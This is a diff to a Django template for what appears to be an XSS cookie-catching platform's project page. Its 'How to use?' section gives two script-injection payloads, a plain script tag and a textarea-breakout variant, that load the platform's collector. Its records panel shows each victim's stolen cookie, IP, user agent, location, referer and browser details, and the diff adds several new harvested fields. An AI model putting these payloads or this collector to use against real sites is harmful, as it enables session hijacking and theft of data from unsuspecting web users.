@@ -11,38 +11,69 @@
             <p>Create time:{{ project.create_time|date:"Y-m-d H:i:s" }}&nbsp;&nbsp;&nbsp;&nbsp;
                 <span class="glyphicon glyphicon-trash"></span>
                 <a href="javascript:void(0)" onclick="delete_project()">Delete this project</a>&nbsp;&nbsp;&nbsp;&nbsp;
-                <span class="glyphicon glyphicon-asterisk"></span><a href="/project/settings/{{ project.id }}">Settings</a>
+                <span class="glyphicon glyphicon-asterisk"></span><a
+                        href="/project/settings/{{ project.id }}">Settings</a>
             </p>
             <hr/>
             <div class="instruction">
                 <p>How to use?</p>
+
                 <p><code>&ltscript src="{{ base_url }}xss/?id={{ project.id }}"&lt/script&gt</code></p>
-                <p><code>&lt/textarea&gt'"&gt&ltscript src="{{ base_url }}xss/?id={{ project.id }}"&lt/script&gt</code></p>
+
+                <p><code>&lt/textarea&gt'"&gt&ltscript src="{{ base_url }}xss/?id={{ project.id }}"&lt/script&gt</code>
+                </p>
+
                 <p>You can test your code <a href="/project/test/" target="_blank">here</a></p>
             </div>
         </div>
         <hr/>
         <div class="project_records">
-            <div class="panel panel-default">
-                <div class="panel-body">
                     {% if not project.records.all %}
                     <p>No cookies</p>
                     {% else %}
+                    <div class="panel-group" id="accordion">
                         {% for record in project.records.all reversed %}
-                            <div class="record">
-                                <p>Record id:<span class="badge">{{ forloop.counter }}</span></p>
-
-                                <p>Create time:{{ record.create_time|date:"Y-m-d H:i:s" }}</p>
-                                <p>Title:<code>{{ record.title }}</code></p>
-                                <p>Url:<code>{{ record.url }}</code></p>
-                                <p>Cookie:
-                                <code>{{ record.cookie }}</code></p>
-                                <p>User agent:<code>{{ record.user_agent }}</code></p>
-
-                                <p>ip:<code>{{ record.ip }}</code></p>
-                                <hr/>
+                        <div class="panel panel-default">
+                            <div class="panel-heading">
+                                <h4 class="panel-title">
+                                    <a data-toggle="collapse" data-toggle="collapse" data-parent="#accordion"
+                                       href="#{{ record.id }}">
+                                        Record id:<span class="badge">{{ forloop.counter }}</span>
+                                        {{ record.create_time|date:"Y-m-d H:i:s" }} -- {{ record.ip }}
+                                    </a>
+                                </h4>
                             </div>
+                            <div class="panel-collapse collapse" id="{{ record.id }}">
+                                <div class="panel-body">
+                                    <p>Record id:<span class="badge">{{ forloop.counter }}</span></p>
+
+                                    <p>Create time:{{ record.create_time|date:"Y-m-d H:i:s" }}</p>
+
+                                    <p>Title:<code>{{ record.title }}</code></p>
+
+                                    <p>Cookie:<code>{{ record.cookie }}</code></p>
+
+                                    <p>User agent:<code>{{ record.user_agent }}</code></p>
+
+                                    <p>Location:<code>{{ record.location }}</code></p>
+
+                                    <p>Top Location:<code>{{ record.top_location }}</code></p>
+
+                                    <p>Domain:<code>{{ record.domain }}</code></p>
+
+                                    <p>ip:<code>{{ record.ip }}</code></p>
+
+                                    <p>Referer:<code>{{ record.referer }}</code></p>
+
+                                    <p>Browser:<code>{{ record.browser }}-{{ record.language }} Flash:{{ record.flash }}</code>
+                                    </p>
+
+                                    <p>Screen:<code>{{ record.screen }}</code></p>
+                                </div>
+                            </div>
+                        </div>
                         {% endfor %}
+                    </div>
                     {% endif %}
                 </div>
             </div>
@@ -58,5 +89,7 @@
     });
   }
 }
+
+
 </script>
 {% endblock %}
